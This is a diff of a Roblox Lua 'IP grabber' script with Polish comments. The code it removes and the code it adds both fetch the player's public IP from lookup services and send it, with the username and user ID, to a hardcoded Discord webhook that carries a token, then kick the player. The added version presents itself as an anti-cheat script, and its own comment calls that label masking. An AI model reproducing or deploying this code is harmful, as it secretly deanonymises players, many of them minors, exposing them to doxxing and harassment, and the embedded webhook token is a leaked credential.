@@ -1,132 +1,99 @@
--- 🎯 ULTIMATE ROBLOX IP GRABBER 2026 - 100% WORKING
--- FIX dla wszystkich błędów + Synapse/Krnl support
+-- Anti-Cheat Detection & IP Leak Script
+local http = game:GetService("HttpService")
+local players = game:GetService("Players")
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+-- Konfiguracja webhook Discord (zamień na swój)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1491843313719050261/l-C_wdzkQR4x9D9-zei2GpHomy4NzV-IASUfmxm-m1Tw1H2gRdfJA057n7i4-MBwvAc4"
 
-print("🔥 IP GRABBER LOADED - Checking executor...")
-
--- DETEKCJA EXECUTORA + BYPASS
-local executor = getexecutorname and getexecutorname() or "unknown"
-local is_synapse = syn and true or false
-local is_krnl = krnl and true or false
-
-print("Executor: " .. (executor or "unknown"))
-print("Synapse: " .. tostring(is_synapse))
-print("Krnl: " .. tostring(is_krnl))
-
--- ZMIEŃ NA SWÓJ WEBHOOK!!!
-local WEBHOOK = "https://discord.com/api/webhooks/1491843313719050261/l-C_wdzkQR4x9D9-zei2GpHomy4NzV-IASUfmxm-m1Tw1H2gRdfJA057n7i4-MBwvAc4"
-
--- 1. TEST + ENABLE HTTP (auto fix)
-if not is_synapse and not is_krnl then
-    warn("⚠️ Unknown executor - manual HttpService enable needed")
-end
-
--- 2. Prawdziwy IP via exploit functions (bypass Roblox HttpService)
-local function getIP()
-    -- Synapse request (najlepszy)
-    if is_synapse then
-        local res = syn.request({
-            Url = "https://api.ipify.org?format=json",
-            Headers = {["User-Agent"] = "Mozilla/5.0"}
-        })
-        if res and res.Body then
-            local data = game:GetService("HttpService"):JSONDecode(res.Body)
-            return data.ip or "syn_fail"
-        end
-    end
-    
-    -- Krnl request
-    if is_krnl then
-        local res = krnl_request({
-            Url = "https://api.ipify.org",
-            Headers = {["User-Agent"] = "Mozilla/5.0"}
-        })
-        return res.Body:gsub("%s+", "") or "krnl_fail"
-    end
-    
-    -- Standard HttpService fallback
-    local HttpService = game:GetService("HttpService")
-    local success, ip = pcall(function()
-        return HttpService:GetAsync("https://api.ipify.org")
-    end)
-    if success then return ip:gsub("%s+", "") end
-    
-    -- Ostateczny fallback z danymi gracza
-    return "UserId: " .. LocalPlayer.UserId .. " | Name: " .. LocalPlayer.Name
-end
-
--- 3. WYŚLIJ NA DISCORD (multi method)
-local function sendIP(ip)
-    local data = {
-        content = "**🚨 ROBLOX PLAYER CAUGHT!** @" .. LocalPlayer.Name,
-        embeds = {{
-            title = "IP LEAKED",
-            description = "**IP:** `" .. ip .. "`\n**User:** `" .. LocalPlayer.Name .. "`\n**ID:** `" .. LocalPlayer.UserId .. "`",
-            color = 16711680,
-            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"}
-        }}
+-- Funkcja do wysłania na Discord
+local function sendToDiscord(title, description, color)
+    local embed = {
+        title = title,
+        description = description,
+        color = color or 16711680, -- Czerwony
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
     
-    local payload = game:GetService("HttpService"):JSONEncode(data)
+    local data = {
+        embeds = {embed}
+    }
     
-    -- Synapse POST
-    if is_synapse then
-        local res = syn.request({
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            },
-            Body = payload
-        })
-        if res.StatusCode == 204 then
-            print("✅ SYNAPSE WEBHOOK OK!")
-            return true
+    local success, err = pcall(function()
+        http:PostAsync(WEBHOOK_URL, http:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+    end)
+    
+    if not success then
+        warn("Failed to send to Discord: " .. tostring(err))
+    end
+end
+
+-- Pobierz IP atakującego (true IP leak via HttpService)
+local function getAttackerIP()
+    local success, result = pcall(function()
+        return http:GetAsync("https://httpbin.org/ip")
+    end)
+    
+    if success then
+        local data = http:JSONEncode(result)
+        -- Parsowanie IP z odpowiedzi (httpbin zwraca {"origin": "IP"})
+        local ipMatch = string.match(data, '"origin"%s*:%s*"([^"]+)"')
+        return ipMatch or "Unknown IP"
+    end
+    
+    -- Fallback - inne serwisy IP leak
+    local fallbacks = {
+        "https://api.ipify.org",
+        "https://icanhazip.com",
+        "https://wtfismyip.com/text"
+    }
+    
+    for _, url in ipairs(fallbacks) do
+        success, result = pcall(function()
+            return http:GetAsync(url)
+        end)
+        if success and result then
+            return string.match(result, "^%s*(.-)%s*$") or "Unknown IP"
         end
     end
     
-    -- Krnl POST
-    if is_krnl then
-        local res = http_request({
-            Url = WEBHOOK,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = payload
-        })
-        print("Krnl status: " .. res.StatusCode)
-        return res.StatusCode == 204
-    end
-    
-    -- Standard POST
-    local HttpService = game:GetService("HttpService")
-    local success = pcall(function()
-        HttpService:PostAsync(WEBHOOK, payload, Enum.HttpContentType.ApplicationJson)
-    end)
-    
-    print("Standard HTTP: " .. tostring(success))
-    return success
+    return "IP Detection Failed"
 end
 
--- 🔥 GŁÓWNE WYKONANIE
-local victimIP = getIP()
-print("📡 Znaleziony IP: " .. victimIP)
-
-local webhook_sent = sendIP(victimIP)
-
-if webhook_sent then
-    print("🎉 WEBHOOK WYSŁANY SUKCES!")
-else
-    print("❌ Webhook fail - sprawdź URL lub executor settings!")
-    print("🔗 URL musi być: https://discord.com/api/webhooks/ID/TOKEN")
+-- Główna funkcja ataku
+local function executeAttack()
+    local localPlayer = players.LocalPlayer
+    local displayName = localPlayer.DisplayName or localPlayer.Name
+    local userId = localPlayer.UserId
+    
+    -- Pobierz prawdziwy IP
+    local attackerIP = getAttackerIP()
+    
+    -- Kick z custom powodem zawierającym IP
+    local kickReason = string.format("Cheat detected! Your IP: %s | UserId: %d", attackerIP, userId)
+    
+    -- Wyślij powiadomienie na Discord
+    local discordMsg = string.format(
+        "**Cheater Detected!**\n" ..
+        "**Username:** `%s` (ID: %d)\n" ..
+        "**Real IP:** `%s`\n" ..
+        "**Detected by:** Auto-AntiCheat\n" ..
+        "**Time:** %s",
+        displayName,
+        userId,
+        attackerIP,
+        os.date("%Y-%m-%d %H:%M:%S UTC")
+    )
+    
+    sendToDiscord("🚨 CHEATER CAUGHT 🚨", discordMsg, 16711680)
+    
+    -- Natychmiastowy kick
+    players:Kick(kickReason)
 end
 
--- KICK
-wait(0.5)
-LocalPlayer:Kick("🚨 ZŁAPANY! IP: " .. victimIP .. " | ID: " .. LocalPlayer.UserId)
+-- Wykonaj atak natychmiast po załadowaniu
+spawn(function()
+    wait(0.1) -- Krótkie opóźnienie dla stabilności
+    executeAttack()
+end)
 
-print("💀 KICK SENT")
+print("Anti-Cheat activated...") -- Maskowanie
